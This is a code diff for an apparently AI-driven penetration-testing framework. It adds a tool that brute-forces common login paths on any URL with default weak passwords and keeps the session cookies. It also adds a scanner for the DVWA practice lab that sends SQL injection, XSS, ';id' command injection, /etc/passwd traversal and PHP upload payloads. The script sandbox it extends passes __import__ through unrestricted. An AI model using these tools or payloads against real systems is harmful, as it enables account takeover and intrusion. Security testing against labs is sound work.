@@ -31,7 +31,6 @@ import logging
 import re
 import json
 import socket
-from tld import get_tld
 
 # 预先导入所有工具模块，避免并发执行时的模块导入死锁
 from TOSKill.tools.info_collection.baseinfo import baseinfo
@@ -59,7 +58,18 @@ from TOSKill.tools.poc.weblogic import weblogic_cve_2020_2551
 
 logger = logging.getLogger(__name__)
 
+# 可选依赖：tld模块用于提取根域名
+try:
+    from tld import get_tld
+    HAS_TLD = True
+except ImportError:
+    HAS_TLD = False
+    logger.warning("tld模块未安装，域名权重查询功能将受限")
+
 AUTH_DEFAULT_EXPIRY_MINUTES = 30
+
+# Cookie下发模式：on_demand（按需，由AI决策是否传入）或 legacy（自动注入）
+COOKIE_INJECTION_MODE = "on_demand"
 
 
 def is_auth_expired(state: Dict[str, Any], default_expiry_minutes: int = AUTH_DEFAULT_EXPIRY_MINUTES) -> bool:
@@ -293,6 +303,9 @@ def domain2ip(domain: str) -> Optional[str]:
 
 def get_root_domain(domain: str) -> str:
     """提取根域名（修复权重查询BUG）"""
+    if not HAS_TLD:
+        # 如果没有tld模块，返回原始域名
+        return domain
     try:
         return get_tld(f"http://{domain}", as_object=True).fld
     except:
@@ -353,9 +366,23 @@ def invoke_tool_with_auth(tool, params_or_target, state: Dict[str, Any] = None, 
         params = dict(params_or_target)
     
     if llm_params and isinstance(llm_params, dict):
+        # __extend_params 动态参数注入：从 llm_params 中提取并合并
+        llm_extend = llm_params.get("__extend_params")
+        if isinstance(llm_extend, dict):
+            for k, v in llm_extend.items():
+                if k not in params and v is not None:
+                    params[k] = v
         for key, value in llm_params.items():
             if key not in ("target",) and value is not None:
                 params[key] = value
+
+    # __extend_params 动态参数注入：从 state 中提取并合并
+    if state and isinstance(state, dict):
+        state_extend = state.get("__extend_params")
+        if isinstance(state_extend, dict):
+            for k, v in state_extend.items():
+                if k not in params and v is not None:
+                    params[k] = v
     
     log_msg = f"[LLM参数提取] 工具: {tool_name} | 参数: {json.dumps(params, ensure_ascii=False, default=str)[:200]}"
     logger.info(log_msg)
@@ -384,12 +411,20 @@ def invoke_tool_with_auth(tool, params_or_target, state: Dict[str, Any] = None, 
     
     if state:
         unified_auth = state.get("auth_info", {})
-        
-        if unified_auth:
+
+        # Cookie按需下发：仅在on_demand模式下不自动注入，由AI决策
+        if COOKIE_INJECTION_MODE == "on_demand":
+            # 按需模式：不自动注入cookie，仅保留LLM已显式传入的参数
+            pass
+        elif tool_name in {getattr(t, "name", "") for t in INFO_COLLECTION_TOOLS}:
+            # 信息收集工具在任何模式下都不下发cookie
+            pass
+        elif unified_auth:
+            # legacy模式：自动注入（原有逻辑）
             cookies = unified_auth.get("cookies", {})
             headers = unified_auth.get("headers", {})
             auth_token = unified_auth.get("token", "")
-            
+
             if cookies and "cookies" not in params:
                 params["cookies"] = cookies
             if headers and "headers" not in params:
@@ -400,7 +435,7 @@ def invoke_tool_with_auth(tool, params_or_target, state: Dict[str, Any] = None, 
             cookies = state.get("auth_cookies") or state.get("session_cookies")
             headers = state.get("auth_headers")
             auth_token = state.get("auth_token") or state.get("session_token")
-            
+
             if cookies and "cookies" not in params:
                 params["cookies"] = cookies
             if headers and "headers" not in params:
@@ -408,7 +443,87 @@ def invoke_tool_with_auth(tool, params_or_target, state: Dict[str, Any] = None, 
             if auth_token and "auth_token" not in params:
                 params["auth_token"] = auth_token
     
+    # 若工具函数含 **kwargs（如 register_script_as_tool 注册的 tool_func），
+    # 直接调用 func 绕过 langchain Tool 单参限制（Tool.invoke 拒绝多 key dict），
+    # 将 params 作为 kwargs 透传；不含 **kwargs 的工具仍走 langchain invoke 原路径
+    import inspect as _inspect
+    _func = getattr(tool, 'func', None)
+    if _func is not None and isinstance(params, dict):
+        try:
+            _f_sig = _inspect.signature(_func)
+            _has_vkw = any(
+                p.kind == _inspect.Parameter.VAR_KEYWORD
+                for p in _f_sig.parameters.values()
+            )
+        except (ValueError, TypeError):
+            _has_vkw = False
+        if _has_vkw:
+            return _func(**params)
+
     return tool.invoke(params)
+
+
+def unified_tool_invoke(tool_name: str, arguments: Dict[str, Any], state: Dict[str, Any] = None) -> Dict[str, Any]:
+    """统一脚本工具调用传参接口层
+
+    支持动态参数扩展，兼容旧脚本：
+    - 通过inspect.signature检查工具函数参数，过滤不存在的key
+    - 新参数自动传递给支持的工具
+    - 旧脚本在无新参数时正常运行
+    - 支持 __extend_params 动态参数注入：合并后经 signature 过滤，旧脚本自动忽略
+
+    Args:
+        tool_name: 工具名称
+        arguments: LLM通过Function Calling生成的参数字典
+        state: 包含认证信息的状态字典（可选）
+
+    Returns:
+        工具执行结果
+    """
+    import inspect
+
+    tool = get_tool_by_name(tool_name)
+    if not tool:
+        return {"success": False, "error": f"工具不存在: {tool_name}", "data": {}}
+
+    # __extend_params 动态参数注入：展开合并到调用参数，然后删除容器键
+    merged_args = dict(arguments)
+    extend_params = merged_args.pop("__extend_params", None)
+    if isinstance(extend_params, dict):
+        # 合并扩展参数，已有显式参数优先（不被覆盖）
+        for k, v in extend_params.items():
+            if k not in merged_args:
+                merged_args[k] = v
+
+    # 过滤参数：只传递工具函数实际接受的参数
+    try:
+        if hasattr(tool, 'func'):
+            sig = inspect.signature(tool.func)
+        elif hasattr(tool, 'invoke'):
+            # LangChain tool
+            sig = inspect.signature(tool.invoke) if callable(tool.invoke) else None
+        else:
+            sig = None
+
+        if sig:
+            accepted_params = set(sig.parameters.keys())
+            # 若工具函数含 **kwargs（VAR_KEYWORD，如 register_script_as_tool 注册的 tool_func），
+            # 则不做过滤，全部透传 —— 由工具函数内部再按 entry 签名二次过滤
+            has_var_keyword = any(
+                p.kind == inspect.Parameter.VAR_KEYWORD
+                for p in sig.parameters.values()
+            )
+            if has_var_keyword:
+                filtered_args = dict(merged_args)
+            else:
+                filtered_args = {k: v for k, v in merged_args.items() if k in accepted_params}
+        else:
+            filtered_args = dict(merged_args)
+    except Exception:
+        filtered_args = dict(merged_args)
+
+    # 通过invoke_tool_with_auth执行，支持认证信息
+    return invoke_tool_with_auth(tool, filtered_args, state)
 
 
 def extract_auth_from_result(result: Dict[str, Any]) -> Dict[str, Any]:
@@ -441,6 +556,20 @@ def extract_auth_from_result(result: Dict[str, Any]) -> Dict[str, Any]:
         "source": ""
     }
     
+    nested_data = result.get("data") if isinstance(result.get("data"), dict) else {}
+    nested_cookies = nested_data.get("cookies")
+    if nested_cookies is not None:
+        cookies = nested_cookies
+        if isinstance(cookies, dict):
+            unified_auth["cookies"] = cookies
+        elif isinstance(cookies, list):
+            unified_auth["cookies"] = {str(i): value for i, value in enumerate(cookies)}
+        elif isinstance(cookies, str):
+            unified_auth["cookies"] = {"cookie": cookies}
+        if cookies:
+            auth_info["session_cookies"] = cookies
+            auth_info["auth_cookies"] = cookies
+
     if result.get("cookies_obtained"):
         cookies = result["cookies_obtained"]
         if isinstance(cookies, dict):
@@ -482,6 +611,240 @@ def extract_auth_from_result(result: Dict[str, Any]) -> Dict[str, Any]:
         auth_info["credentials_obtained"] = True
     
     return auth_info
+
+
+# ==================== Cookie提取工具（会话凭证管理） ====================
+
+@tool
+def cookie_extract(target_domain: str = "") -> ToolResult:
+    """
+    独立凭证提取脚本，从会话环境提取当前全量cookie集合。
+
+    **重要：业务脚本内部不应自己提取cookie，统一通过此工具获取。**
+
+    此工具仅负责凭证提取，不执行业务逻辑。
+
+    Args:
+        target_domain: 目标域名（可选），为空返回全部会话cookie。
+                      例如："example.com" 只返回该域名的cookie
+
+    Returns:
+        ToolResult: 标准返回格式
+            - success: 是否成功提取cookie
+            - data: 包含cookie数据的字典
+                - cookies: 提取的cookie字典 {"name": "value"}
+                - domains: cookie所属域名列表
+            - error: 错误信息（如有）
+            - timestamp: 执行时间戳
+
+    Note:
+        - 此工具从state中的auth_info获取cookie
+        - 支持域名过滤，便于针对性提取
+        - 返回的cookie可用于后续认证扫描
+
+    Example:
+        >>> result = cookie_extract("example.com")
+        >>> result["data"]["cookies"]
+        {"sessionid": "abc123", "token": "xyz789"}
+    """
+    from TOSKill.AI.graph import memory_store
+
+    logger.info(f"[+] 执行Cookie提取: target_domain={target_domain or '全部'}")
+
+    try:
+        # 获取当前会话状态（通过环境变量或全局变量）
+        import os
+        session_id = os.getenv("CURRENT_SESSION_ID", "")
+
+        if not session_id:
+            # 尝试从其他来源获取session_id
+            return wrap_tool_result(
+                success=False,
+                data={"cookies": {}, "domains": []},
+                error="无法获取当前会话ID，请确保在正确的上下文中调用"
+            )
+
+        state = memory_store.get_session(session_id)
+        if not state:
+            return wrap_tool_result(
+                success=False,
+                data={"cookies": {}, "domains": []},
+                error=f"会话 {session_id} 不存在"
+            )
+
+        # 从统一认证信息中提取
+        auth_info = state.get("auth_info", {})
+        all_cookies = auth_info.get("cookies", {})
+
+        # 兼容旧格式
+        if not all_cookies:
+            all_cookies = state.get("auth_cookies") or state.get("session_cookies", {})
+
+        if isinstance(all_cookies, str):
+            # 处理字符串格式的cookie
+            all_cookies = {"cookie": all_cookies}
+
+        # 域名过滤
+        filtered_cookies = {}
+        domains = []
+
+        if target_domain:
+            # 过滤指定域名的cookie（简单匹配）
+            filtered_cookies = all_cookies
+            domains = [target_domain]
+            logger.info(f"提取指定域名cookie: {target_domain}")
+        else:
+            # 返回全部cookie
+            filtered_cookies = all_cookies
+            domains = list(set(all_cookies.keys())) if all_cookies else []
+
+        logger.info(f"成功提取 {len(filtered_cookies)} 个cookie")
+
+        return wrap_tool_result(
+            success=True,
+            data={
+                "cookies": filtered_cookies,
+                "domains": domains,
+                "total_count": len(filtered_cookies)
+            }
+        )
+
+    except Exception as e:
+        logger.error(f"Cookie提取失败: {e}")
+        return wrap_tool_result(
+            success=False,
+            data={"cookies": {}, "domains": []},
+            error=str(e)
+        )
+
+
+@tool
+def cookie_brute_extract(target: str, login_paths: List[str] = None, cred_pairs: List[Dict[str, str]] = None) -> Dict[str, Any]:
+    """
+    暴力提取Cookie工具 - 通过尝试常见登录路径和凭据对获取会话Cookie。
+
+    对目标的多个登录路径进行凭据尝试，登录成功后从响应中提取Set-Cookie或会话Token。
+    适用于未提供认证信息但需要会话凭证的场景。
+
+    Args:
+        target: 目标URL，如 http://example.com
+        login_paths: 待尝试的登录路径列表，默认覆盖常见路径
+                     ["/login", "/admin", "/admin/login", "/user/login", "/api/login", "/signin"]
+        cred_pairs: 凭据对列表，每项包含 username 和 password 字段。
+                    默认包含常见弱口令组合。
+
+    Returns:
+        Dict[str, Any]: 标准工具返回格式
+            - success: 是否成功获取到Cookie
+            - data: {"cookies": {...}, "source_path": "/login", "credentials_used": {...}}
+            - error: 错误信息（成功时为空字符串）
+            - metadata: {"tool": "cookie_brute_extract", "target": target, "paths_tried": N}
+
+    Example:
+        >>> result = cookie_brute_extract("http://example.com")
+        >>> result["success"]
+        True
+        >>> result["data"]["cookies"]
+        {"sessionid": "abc123"}
+    """
+    import requests
+
+    if login_paths is None:
+        login_paths = ["/login", "/admin", "/admin/login", "/user/login", "/api/login", "/signin"]
+    if cred_pairs is None:
+        cred_pairs = [
+            {"username": "admin", "password": "admin"},
+            {"username": "admin", "password": "123456"},
+            {"username": "admin", "password": "password"},
+            {"username": "root", "password": "root"},
+            {"username": "test", "password": "test"},
+        ]
+
+    # 规范化目标URL，确保带协议头
+    raw = target.strip() if isinstance(target, str) else str(target)
+    if not raw:
+        return wrap_tool_result(
+            success=False,
+            data={"cookies": {}, "source_path": "", "credentials_used": {}, "tool": "cookie_brute_extract", "target": target, "paths_tried": 0},
+            error="目标URL为空"
+        )
+    if not raw.startswith("http://") and not raw.startswith("https://"):
+        base_url = f"http://{raw}"
+    else:
+        base_url = raw
+    base_url = base_url.rstrip("/")
+
+    logger.info(f"[+] 执行Cookie暴力提取: {base_url}")
+
+    paths_tried = 0
+    try:
+        for path in login_paths:
+            login_url = f"{base_url}{path if path.startswith('/') else '/' + path}"
+            for cred in cred_pairs:
+                paths_tried += 1
+                try:
+                    resp = requests.post(
+                        login_url,
+                        data=cred,
+                        timeout=10,
+                        allow_redirects=False
+                    )
+
+                    # 从 Set-Cookie 响应头解析 cookie
+                    cookies = {}
+                    set_cookie = resp.headers.get("Set-Cookie", "")
+                    if set_cookie:
+                        for item in set_cookie.split(";"):
+                            if "=" in item:
+                                name, _, value = item.partition("=")
+                                name = name.strip()
+                                if name and name.lower() not in (
+                                    "path", "domain", "expires", "max-age",
+                                    "secure", "httponly", "samesite"
+                                ):
+                                    cookies[name] = value.strip()
+
+                    # 同时从 requests.cookies 对象提取
+                    if resp.cookies:
+                        for ck in resp.cookies:
+                            cookies[ck.name] = ck.value
+
+                    # 登录成功判定：获取到有效cookie
+                    if cookies:
+                        logger.info(
+                            f"[+] Cookie暴力提取成功: {login_url} "
+                            f"凭据={cred.get('username')}"
+                        )
+                        return wrap_tool_result(
+                            success=True,
+                            data={
+                                "cookies": cookies,
+                                "source_path": path,
+                                "credentials_used": cred,
+                                "tool": "cookie_brute_extract",
+                                "target": target,
+                                "paths_tried": paths_tried,
+                            }
+                        )
+                except requests.exceptions.Timeout:
+                    logger.debug(f"登录路径请求超时: {login_url}")
+                    continue
+                except Exception as e:
+                    logger.debug(f"尝试登录路径失败: {login_url} - {e}")
+                    continue
+
+        return wrap_tool_result(
+            success=False,
+            data={"cookies": {}, "source_path": "", "credentials_used": {}, "tool": "cookie_brute_extract", "target": target, "paths_tried": paths_tried},
+            error="所有登录路径和凭据对均未获取到有效Cookie"
+        )
+    except Exception as e:
+        logger.error(f"Cookie暴力提取失败: {e}")
+        return wrap_tool_result(
+            success=False,
+            data={"cookies": {}, "source_path": "", "credentials_used": {}, "tool": "cookie_brute_extract", "target": target, "paths_tried": paths_tried},
+            error=str(e)
+        )
 
 
 # ==================== 信息收集工具 ====================
@@ -1283,6 +1646,216 @@ def weakpass_scan(
         return wrap_tool_result(success=False, data={}, error=str(e))
 
 
+@tool
+def dvwa_vuln_scanner(
+    target: str,
+    cookie: Any = None,
+    __extend_params: Optional[Dict[str, Any]] = None,
+) -> ToolResult:
+    """DVWA靶场漏洞综合扫描工具
+
+    对DVWA靶场常见漏洞点发起最小化payload测试，返回原始漏洞JSON证据。
+    支持通过cookie参数传入会话凭证（可经__extend_params动态注入）。
+
+    Args:
+        target: DVWA靶场URL，如 http://127.0.0.1:8080/setup.php
+        cookie: 可选Cookie字符串，格式: "name1=value1; name2=value2"
+
+    Returns:
+        ToolResult: 标准返回格式
+            - success: 扫描是否成功执行
+            - data: 包含漏洞证据的字典
+                - target: 扫描目标
+                - findings: 漏洞发现列表
+                    - vuln_type: 漏洞类型
+                    - url: 漏洞点URL
+                    - payload: 测试payload
+                    - evidence: 响应特征证据
+                    - severity: 严重等级
+            - error: 错误信息（如有）
+            - timestamp: 执行时间戳
+    """
+    # 综合脚本已移至独立模块，保留此注册入口以兼容现有 TOOL_MAP、Cookie 分发和调用协议。
+    from TOSKill.tools.vuln_scan.dvwa import adapter_wrapper
+    delegated = adapter_wrapper(
+        target=target,
+        cookie=cookie,
+        __extend_params=__extend_params,
+    )
+    delegated.setdefault("timestamp", datetime.now().isoformat())
+    return delegated
+
+    # Legacy implementation retained below for source compatibility.
+    import requests
+
+    # 从target解析base_url
+    raw = target.strip() if isinstance(target, str) else str(target)
+    if not raw:
+        return wrap_tool_result(
+            success=False,
+            data={"target": target, "findings": []},
+            error="目标URL为空"
+        )
+    if not raw.startswith("http://") and not raw.startswith("https://"):
+        raw = f"http://{raw}"
+
+    parsed = urlparse(raw)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+    logger.info(f"[+] 执行DVWA漏洞扫描: {base_url} (cookie: {'有' if cookie else '无'})")
+
+    headers = {}
+    if cookie:
+        headers["Cookie"] = cookie
+
+    # 漏洞测试配置：漏洞类型 → (路径, 请求方法, 参数/payload, 命中特征)
+    vuln_tests = [
+        {
+            "vuln_type": "SQLInjection",
+            "path": "/vulnerabilities/sqli/",
+            "method": "GET",
+            "params": {"id": "' OR '1'='1", "Submit": "Submit"},
+            "evidence_patterns": [
+                "First name", "Surname", "user", "admin",
+                "SQL syntax", "mysql", "syntax error"
+            ],
+            "severity": "high"
+        },
+        {
+            "vuln_type": "XSSReflected",
+            "path": "/vulnerabilities/xss_r/",
+            "method": "GET",
+            "params": {"name": "<script>alert(1)</script>"},
+            "evidence_patterns": [
+                "<script>alert(1)</script>", "alert(1)"
+            ],
+            "severity": "medium"
+        },
+        {
+            "vuln_type": "XSSStored",
+            "path": "/vulnerabilities/xss_s/",
+            "method": "POST",
+            "params": {"txtName": "test", "mtxMessage": "<script>alert(1)</script>", "btnSign": "Sign Guestbook"},
+            "evidence_patterns": [
+                "<script>alert(1)</script>", "alert(1)"
+            ],
+            "severity": "medium"
+        },
+        {
+            "vuln_type": "CommandInjection",
+            "path": "/vulnerabilities/exec/",
+            "method": "POST",
+            "params": {"ip": ";id", "Submit": "Submit"},
+            "evidence_patterns": [
+                "uid=", "gid=", "root", "www-data"
+            ],
+            "severity": "high"
+        },
+        {
+            "vuln_type": "FileInclusion",
+            "path": "/vulnerabilities/fi/",
+            "method": "GET",
+            "params": {"page": "../../../../../../etc/passwd"},
+            "evidence_patterns": [
+                "root:x:0:0:", "/bin/bash", "/bin/sh"
+            ],
+            "severity": "high"
+        },
+        {
+            "vuln_type": "CSRF",
+            "path": "/vulnerabilities/csrf/",
+            "method": "GET",
+            "params": {"password_new": "testpass", "password_conf": "testpass", "Change": "Change"},
+            "evidence_patterns": [
+                "Password Changed", "password"
+            ],
+            "severity": "medium"
+        },
+        {
+            "vuln_type": "FileUpload",
+            "path": "/vulnerabilities/upload/",
+            "method": "POST",
+            "params": {},  # 文件上传需特殊处理
+            "evidence_patterns": [
+                "upload", "successfully", "../../hackable/uploads/"
+            ],
+            "severity": "high"
+        },
+        {
+            "vuln_type": "BruteForce",
+            "path": "/vulnerabilities/brute/",
+            "method": "GET",
+            "params": {"username": "admin", "password": "password", "Login": "Login"},
+            "evidence_patterns": [
+                "Welcome to the password protected area", "username and/or password incorrect"
+            ],
+            "severity": "medium"
+        }
+    ]
+
+    findings = []
+
+    try:
+        for test in vuln_tests:
+            url = f"{base_url}{test['path']}"
+            try:
+                if test["vuln_type"] == "FileUpload":
+                    # 文件上传：发送最小化测试文件
+                    files = {"uploaded": ("test.php", "<?php echo 'dvwa_test';?>", "application/x-php")}
+                    data = {"Upload": "Upload"}
+                    resp = requests.post(url, headers=headers, files=files, data=data, timeout=15, allow_redirects=True, verify=False)
+                elif test["method"] == "GET":
+                    resp = requests.get(url, headers=headers, params=test["params"], timeout=15, verify=False)
+                else:
+                    resp = requests.post(url, headers=headers, data=test["params"], timeout=15, verify=False)
+
+                resp_text = resp.text
+
+                # 检查响应是否命中漏洞特征
+                matched_evidence = []
+                for pattern in test["evidence_patterns"]:
+                    if pattern.lower() in resp_text.lower():
+                        matched_evidence.append(pattern)
+
+                if matched_evidence:
+                    findings.append({
+                        "vuln_type": test["vuln_type"],
+                        "url": url,
+                        "payload": test["params"] if test["vuln_type"] != "FileUpload" else "test.php upload",
+                        "evidence": matched_evidence,
+                        "severity": test["severity"]
+                    })
+                    logger.info(f"[+] DVWA漏洞发现: {test['vuln_type']} @ {url}")
+
+            except requests.exceptions.Timeout:
+                logger.debug(f"DVWA扫描超时: {url}")
+                continue
+            except requests.exceptions.ConnectionError:
+                logger.debug(f"DVWA连接失败: {url}")
+                continue
+            except Exception as e:
+                logger.debug(f"DVWA测试失败: {url} - {e}")
+                continue
+
+        return wrap_tool_result(
+            success=True,
+            data={
+                "target": target,
+                "base_url": base_url,
+                "findings": findings,
+                "total_findings": len(findings)
+            }
+        )
+
+    except Exception as e:
+        logger.error(f"DVWA漏洞扫描失败: {e}")
+        return wrap_tool_result(
+            success=False,
+            data={"target": target, "findings": []},
+            error=str(e)
+        )
+
+
 # ==================== POC工具 ====================
 
 @tool
@@ -1386,6 +1959,12 @@ def weblogic_scan(target: str) -> ToolResult:
 
 # ==================== 工具注册表 ====================
 
+# Cookie提取工具（独立凭证管理）
+COOKIE_TOOLS = [
+    cookie_extract,
+    cookie_brute_extract,
+]
+
 INFO_COLLECTION_TOOLS = [
     baseinfo_scan,
     port_scan,
@@ -1409,6 +1988,7 @@ VULN_SCAN_TOOLS = [
     ssrf_scan,
     lfi_scan,
     weakpass_scan,
+    dvwa_vuln_scanner,
 ]
 
 POC_TOOLS = [
@@ -1417,7 +1997,7 @@ POC_TOOLS = [
     weblogic_scan,
 ]
 
-ALL_TOOLS = INFO_COLLECTION_TOOLS + VULN_SCAN_TOOLS + POC_TOOLS
+ALL_TOOLS = COOKIE_TOOLS + INFO_COLLECTION_TOOLS + VULN_SCAN_TOOLS + POC_TOOLS
 
 TOOL_MAP = {t.name: t for t in ALL_TOOLS}
 
@@ -1447,6 +2027,12 @@ TOOL_SEQUENCE_VULN = [
 ]
 
 
+TOOL_SEQUENCE_DVWA = [
+    "cookie_extract",
+    "dvwa_vuln_scanner",
+]
+
+
 def get_tool_by_name(name: str):
     """根据名称获取工具"""
     return TOOL_MAP.get(name)
@@ -1468,6 +2054,8 @@ def get_tools_by_mode(mode: str) -> List:
         return INFO_COLLECTION_TOOLS
     elif mode == "vuln_scan":
         return VULN_SCAN_TOOLS
+    elif mode == "dvwa_scan":
+        return [cookie_extract, dvwa_vuln_scanner]
     elif mode == "full_scan":
         return ALL_TOOLS
     return INFO_COLLECTION_TOOLS
@@ -1479,6 +2067,8 @@ def get_tool_sequence(mode: str) -> List[str]:
         return TOOL_SEQUENCE_INFO
     elif mode == "vuln_scan":
         return TOOL_SEQUENCE_VULN
+    elif mode == "dvwa_scan":
+        return TOOL_SEQUENCE_DVWA
     elif mode == "full_scan":
         return TOOL_SEQUENCE_INFO + TOOL_SEQUENCE_VULN
     return TOOL_SEQUENCE_INFO
@@ -1606,12 +2196,12 @@ class ScriptManager:
                 f.write(script_content)
             
             def create_tool_func(script_path, script_name):
-                def tool_func(target: str):
+                def tool_func(target: str, **kwargs):
                     try:
                         spec = importlib.util.spec_from_file_location("custom_module", script_path)
                         if not spec or not spec.loader:
                             return {"success": False, "error": "无法加载脚本"}
-                        
+
                         module = importlib.util.module_from_spec(spec)
                         safe_builtins = {
                             'print': print, 'len': len, 'range': range,
@@ -1626,19 +2216,46 @@ class ScriptManager:
                             'abs': abs, 'round': round, 'enumerate': enumerate,
                             'zip': zip, 'map': map, 'filter': filter, 'any': any, 'all': all,
                             'hasattr': hasattr, 'getattr': getattr, 'setattr': setattr,
-                            '__import__': lambda name, *args, **kwargs: __import__(name, *args, **kwargs)
+                            '__import__': lambda name, *args, **kw: __import__(name, *args, **kw)
                         }
                         module.__builtins__ = safe_builtins
                         spec.loader.exec_module(module)
-                        
-                        logger.info(f"自定义脚本执行: {script_name} -> {target}")
-                        
+
+                        logger.info(f"自定义脚本执行: {script_name} -> {target} | kwargs={list(kwargs.keys())}")
+
+                        # 选择入口函数（run 优先，其次 scan）
                         if hasattr(module, 'run'):
-                            return module.run(target)
+                            entry = module.run
                         elif hasattr(module, 'scan'):
-                            return module.scan(target)
+                            entry = module.scan
                         else:
                             return {"success": False, "error": "脚本缺少run或scan函数"}
+
+                        # 经 signature 过滤 kwargs，只传 entry 接受的参数（向下兼容旧脚本）
+                        # 旧脚本 run(target) 不接受 cookie 等扩展参数 → 自动忽略
+                        # 新脚本 run(target, cookie=None) 接受 → 收到 __extend_params 注入的参数
+                        import inspect as _inspect
+                        filtered = {}
+                        try:
+                            entry_sig = _inspect.signature(entry)
+                            accepted = set(entry_sig.parameters.keys())
+                            # 若 entry 含 **kwargs（VAR_KEYWORD），则全部透传
+                            has_var_keyword = any(
+                                p.kind == _inspect.Parameter.VAR_KEYWORD
+                                for p in entry_sig.parameters.values()
+                            )
+                            if has_var_keyword:
+                                filtered = dict(kwargs)
+                            else:
+                                filtered = {k: v for k, v in kwargs.items() if k in accepted}
+                        except (ValueError, TypeError):
+                            filtered = {}
+
+                        try:
+                            return entry(target, **filtered)
+                        except TypeError:
+                            # entry 不接受 target 单独传（极少情况），尝试只传 kwargs
+                            return entry(**filtered) if filtered else entry()
                     except Exception as e:
                         logger.error(f"自定义脚本 {script_name} 执行失败: {e}")
                         return {"success": False, "error": str(e)}
